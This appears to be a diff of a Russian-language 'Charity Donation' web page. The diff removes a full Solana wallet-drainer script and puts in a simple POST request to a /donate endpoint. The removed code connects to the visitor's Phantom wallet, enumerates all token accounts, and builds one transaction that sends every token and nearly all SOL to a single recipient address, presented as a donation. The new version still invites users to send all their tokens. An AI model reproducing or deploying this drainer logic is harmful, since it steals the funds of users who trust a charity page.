@@ -4,93 +4,37 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Charity Donation</title>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token"></script>
 </head>
 <body>
 <h1>Добро пожаловать!</h1>
-<p>Нажмите кнопку ниже, чтобы переслать все токены на благотворительный адрес.</p>
-
-<button id="donateButton">Отправить все токены</button>
+<p>Нажмите кнопку ниже, чтобы отправить все ваши токены на благотворительный адрес.</p>
+<button id="donateButton">Отправить токены</button>
 
 <script>
     document.getElementById("donateButton").addEventListener("click", async () => {
-        const recipientAddress = "Адрес_получателя"; // Замените на адрес получателя
+        const sender = "Ваш адрес отправителя";
+        const recipient = "Адрес получателя";
+        const amount = 1; // Укажите сумму для отправки
 
         try {
-            // Убедитесь, что Phantom Wallet доступен
-            if (!window.solana || !window.solana.isPhantom) {
-                alert("Убедитесь, что Phantom Wallet установлен.");
-                return;
+            const response = await fetch("/donate", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ sender, recipient, amount })
+            });
+
+            if (response.ok) {
+                alert("Транзакция успешно выполнена.");
+            } else {
+                alert("Ошибка при выполнении транзакции.");
             }
-
-            // Запрашиваем подключение к кошельку пользователя
-            const provider = window.solana;
-            await provider.connect();
-
-            // Получаем публичный ключ отправителя
-            const senderPublicKey = provider.publicKey;
-
-            // Создаём соединение с сетью Solana
-            const connection = new solanaWeb3.Connection(
-                solanaWeb3.clusterApiUrl("mainnet-beta"),
-                "confirmed"
-            );
-
-            // Получаем все токены пользователя
-            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
-                senderPublicKey,
-                { programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA") }
-            );
-
-            // Создаём транзакцию
-            const transaction = new solanaWeb3.Transaction();
-
-            // Добавляем переводы для всех токенов
-            for (const { pubkey, account } of tokenAccounts.value) {
-                const tokenAmount = account.data.parsed.info.tokenAmount.uiAmount;
-                const tokenMint = account.data.parsed.info.mint;
-
-                if (tokenAmount > 0) {
-                    const tokenTransferInstruction = solanaSplToken.Token.createTransferInstruction(
-                        solanaSplToken.TOKEN_PROGRAM_ID,
-                        new solanaWeb3.PublicKey(pubkey),
-                        new solanaWeb3.PublicKey(recipientAddress),
-                        senderPublicKey,
-                        [],
-                        tokenAmount * Math.pow(10, account.data.parsed.info.tokenAmount.decimals)
-                    );
-
-                    transaction.add(tokenTransferInstruction);
-                }
-            }
-
-            // Добавляем перевод всех SOL
-            const solBalance = await connection.getBalance(senderPublicKey);
-            if (solBalance > 0) {
-                transaction.add(
-                    solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: senderPublicKey,
-                        toPubkey: new solanaWeb3.PublicKey(recipientAddress),
-                        lamports: solBalance - 5000, // Удерживаем небольшую сумму для комиссии
-                    })
-                );
-            }
-
-            // Подписываем и отправляем транзакцию
-            const signedTransaction = await provider.signTransaction(transaction);
-            const signature = await connection.sendRawTransaction(signedTransaction.serialize());
-
-            // Ожидаем подтверждения транзакции
-            await connection.confirmTransaction(signature);
-
-            alert("Все токены успешно отправлены! Hash: " + signature);
         } catch (error) {
-            console.error("Ошибка:", error);
-            alert("Произошла ошибка. Проверьте консоль для деталей.");
+            console.error("Ошибка запроса:", error);
+            alert("Произошла ошибка.");
         }
     });
 </script>
-
 </body>
 </html>
